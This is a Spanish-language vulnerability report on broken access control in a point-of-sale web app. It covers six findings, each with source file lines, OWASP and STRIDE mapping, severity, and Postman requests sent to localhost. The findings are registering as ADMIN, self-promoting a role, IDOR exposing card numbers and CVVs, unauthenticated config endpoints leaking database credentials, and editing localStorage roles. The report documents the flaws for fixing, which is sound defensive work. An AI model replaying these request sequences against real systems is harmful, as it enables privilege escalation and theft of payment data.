# Reporte Broken Access Control

Requests de la colección de Postman `Vulnerabilidades` › `Broken Access Control`, contra `http://localhost:5173`.

## 01 · Endpoints sensibles sin sesión

| | |
|---|---|
| Archivo:línea | `config/SecurityConfig.java:39-43`, `config/ConfiguracionControlador.java:28-31,41-67`, `reporte/ReporteControlador.java:50-53` |
| Impacto | Credenciales root de MySQL, claves de pasarela, JWT y estructura de la BD sin autenticarse |
| STRIDE / OWASP | Elevation of Privilege, Information Disclosure · A01 Broken Access Control |
| Severidad | **Crítica**: sin sesión y con una sola petición |

```json
{ "method": "GET", "url": "http://localhost:5173/api/diagnostico" }
{ "method": "GET", "url": "http://localhost:5173/api/configuracion" }
{ "method": "GET", "url": "http://localhost:5173/api/reportes/base-datos" }
```

Respuesta: `200` · `{"conexionBaseDatos":{"usuario":"root","password":"root123"},"configuracionSecreta":[{"clave":"pasarela.api.key","valor":"sk_live_..."}]}`

## 02 · Vendedor accede a funciones de ADMIN

| | |
|---|---|
| Archivo:línea | `usuario/UsuarioControlador.java:17-19,27-30,49-63`, `config/ConfiguracionControlador.java:28-31,41-67`, `reporte/ReporteControlador.java:50-53`, `pago/PagoControlador.java:53-63` |
| Impacto | Lista contraseñas de todos los usuarios y accede a configuración, diagnóstico y estructura de la BD |
| STRIDE / OWASP | Elevation of Privilege, Information Disclosure · A01 Broken Access Control |
| Severidad | **Crítica**: cualquier usuario autenticado obtiene datos de administración |

```json
{ "method": "POST", "url": "http://localhost:5173/api/auth/login", "body": "{\"username\":\"vendedor\",\"password\":\"vendedor\"}" }
{ "method": "GET", "url": "http://localhost:5173/api/usuarios" }
{ "method": "GET", "url": "http://localhost:5173/api/configuracion" }
{ "method": "GET", "url": "http://localhost:5173/api/diagnostico" }
{ "method": "GET", "url": "http://localhost:5173/api/reportes/base-datos" }
```

Respuesta: `200` · `[{"username":"admin","password":"admin","rol":"ADMIN"},...]` y `200` en los demás endpoints.

## 03 · Registro público con rol ADMIN

| | |
|---|---|
| Archivo:línea | `auth/AuthServicio.java:29-36,56-57`, `auth/AuthControlador.java:71-74` |
| Impacto | Cualquiera crea una cuenta ADMIN sin credenciales |
| STRIDE / OWASP | Elevation of Privilege · A01 Broken Access Control |
| Severidad | **Crítica**: escalada vertical sin autenticación |

```json
{ "method": "POST", "url": "http://localhost:5173/api/auth/registro", "body": "{\"username\":\"pwn\",\"password\":\"pwn\",\"rol\":\"ADMIN\"}" }
{ "method": "POST", "url": "http://localhost:5173/api/auth/login", "body": "{\"username\":\"pwn\",\"password\":\"pwn\"}" }
{ "method": "GET", "url": "http://localhost:5173/api/usuarios" }
```

Respuesta: `200` · `{"usuario":{"username":"pwn","rol":"ADMIN",...}}` y luego `200` en `/api/usuarios`.

## 04 · Cambio de rol de otro usuario

| | |
|---|---|
| Archivo:línea | `usuario/UsuarioServicio.java:63-80` (rol en `:73-76`), `usuario/UsuarioControlador.java:49-52` |
| Impacto | Un vendedor se autopromueve a ADMIN o cambia el rol de un compañero |
| STRIDE / OWASP | Elevation of Privilege · A01 Broken Access Control |
| Severidad | **Alta**: requiere cuenta, pero otorga control administrativo |

```json
{ "method": "PUT", "url": "http://localhost:5173/api/usuarios/3", "body": "{\"username\":\"vendedor\",\"password\":\"vendedor\",\"nombre\":\"Vendedor Mostrador\",\"email\":\"vendedor@puntoventa.local\",\"rol\":\"ADMIN\",\"activo\":true}" }
{ "method": "POST", "url": "http://localhost:5173/api/auth/login", "body": "{\"username\":\"vendedor\",\"password\":\"vendedor\"}" }
{ "method": "GET", "url": "http://localhost:5173/api/auth/yo" }
```

Respuesta: `200` · `{"id":3,"rol":"ADMIN",...}` y `/api/auth/yo` devuelve `ROL_ADMIN`.

## 05 · IDOR en ventas y pagos

| | |
|---|---|
| Archivo:línea | `venta/VentaControlador.java:86-106`, `venta/VentaServicio.java:257-296`, `pago/PagoControlador.java:38-47` |
| Impacto | Leer y anular ventas ajenas; ver tarjeta y CVV de otros pagos |
| STRIDE / OWASP | Information Disclosure, Tampering · A01 Broken Access Control |
| Severidad | **Alta**: requiere conocer IDs; permite fraude y expone datos de tarjeta |

```json
{ "method": "GET", "url": "http://localhost:5173/api/ventas/2" }
{ "method": "POST", "url": "http://localhost:5173/api/ventas/2/anular?motivo=prueba" }
{ "method": "GET", "url": "http://localhost:5173/api/pagos/venta/2" }
```

Respuesta: `200` · `{"id":2,"usuarioId":4,"estado":"ANULADA",...}` y `{"numeroTarjeta":"...","cvv":"..."}`

## 06 · El rol ADMIN solo se valida en el cliente

| | |
|---|---|
| Archivo:línea | `frontend/src/App.jsx:21-31`, `frontend/src/auth/ContextoAuth.jsx:56` |
| Impacto | Cualquiera habilita la UI de ADMIN editando `localStorage` |
| STRIDE / OWASP | Elevation of Privilege · A01 Broken Access Control |
| Severidad | **Media**: no otorga permisos por sí solo, pero anula la defensa de la UI y se combina con 02/04 |

Pasos: login como `vendedor` › DevTools › Application › Local Storage › `pv_usuario` › cambiar `authorities` a `[{"authority":"ROL_ADMIN"}]` › recargar › abrir `/usuarios`.

```json
{ "authorities": [{ "authority": "ROL_ADMIN" }] }
```

Respuesta: la vista de administración se muestra; antes del fix, `/api/usuarios` también responde `200`.

---

Las peticiones están en `peticiones broken access control.json`. Ejecutar el login antes de las peticiones autenticadas para que Postman reutilice la cookie `PVSESSION`.
